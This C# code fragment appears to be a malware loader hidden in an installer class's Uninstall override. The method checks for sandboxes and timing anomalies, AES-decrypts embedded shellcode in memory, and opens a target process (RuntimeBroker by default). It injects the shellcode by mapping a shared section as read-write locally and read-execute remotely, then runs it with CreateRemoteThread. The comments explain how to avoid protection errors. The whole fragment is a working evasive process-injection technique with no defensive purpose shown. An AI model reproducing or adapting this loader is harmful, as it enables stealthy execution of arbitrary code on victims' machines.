        private static readonly string TargetProcessName =
            Environment.GetEnvironmentVariable("INJ_TARGET") ?? "RuntimeBroker";
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // -- 1. Sandbox checks -------------------------------------------
            // FLS check: sandboxes/analysis environments often fail FlsAlloc with null callback
            if (FlsAlloc(IntPtr.Zero) == 0xFFFFFFFF) return;

            // Timing check: accelerated/sandboxed clocks return from Sleep too quickly
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            if (DateTime.Now.Subtract(t1).TotalSeconds < 1.5) return;

            // -- 2. AES decrypt shellcode in memory --------------------------
            byte[] shellcode;
            using (Aes aes = Aes.Create())
            {
                aes.Key = AesKey;
                aes.IV = AesIV;
                using (var dec = aes.CreateDecryptor())
                    shellcode = dec.TransformFinalBlock(EncryptedShellcode, 0, EncryptedShellcode.Length);
            }

            // -- 3. Locate target process ------------------------------------
            var procs = Process.GetProcessesByName(TargetProcessName);
            if (procs.Length == 0) return;
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, procs[0].Id);
            if (hProcess == IntPtr.Zero) return;

            // -- 4. Section injection (write via local RW view, execute via remote RX view)
            IntPtr hSection = IntPtr.Zero;
            IntPtr localView = IntPtr.Zero;
            IntPtr remoteView = IntPtr.Zero;
            ulong size = (ulong)shellcode.Length;
            UIntPtr viewSize = UIntPtr.Zero;
            ulong offset = 0;

            // Create a pagefile-backed section. It MUST be PAGE_EXECUTE_READWRITE so
            // that an executable (RX) view can be mapped - a PAGE_READWRITE section
            // can never be made executable (NtProtectVirtualMemory returns
            // STATUS_SECTION_PROTECTION / 0xC000004E for section views).
            uint status = NtCreateSection(ref hSection, SECTION_ALL_ACCESS, IntPtr.Zero, ref size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
            if (status != 0) return;

            // Map the section into our own process as RW purely to write the shellcode
            status = NtMapViewOfSection(hSection, GetCurrentProcess(), ref localView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref viewSize, 1, 0, PAGE_READWRITE);
            if (status != 0) { NtClose(hSection); return; }

            // Write decrypted shellcode into the local view (shared section pages)
            Marshal.Copy(shellcode, 0, localView, shellcode.Length);

            // Map the same (now populated) section into the target process DIRECTLY as
            // PAGE_EXECUTE_READ. A section view's protection is fixed at map time, so
            // the executable view must be requested here - it cannot be flipped from
            // RW to RX afterwards with NtProtectVirtualMemory.
            status = NtMapViewOfSection(hSection, hProcess, ref remoteView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref viewSize, 1, 0, PAGE_EXECUTE_READ);
            if (status != 0) { NtUnmapViewOfSection(GetCurrentProcess(), localView); NtClose(hSection); return; }

            // Unmap local view and close section handle - remote view persists
            NtUnmapViewOfSection(GetCurrentProcess(), localView);
            NtClose(hSection);

            // -- 5. Execute via remote thread (remote view is already RX) -----
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteView, IntPtr.Zero, 0, IntPtr.Zero);
        }
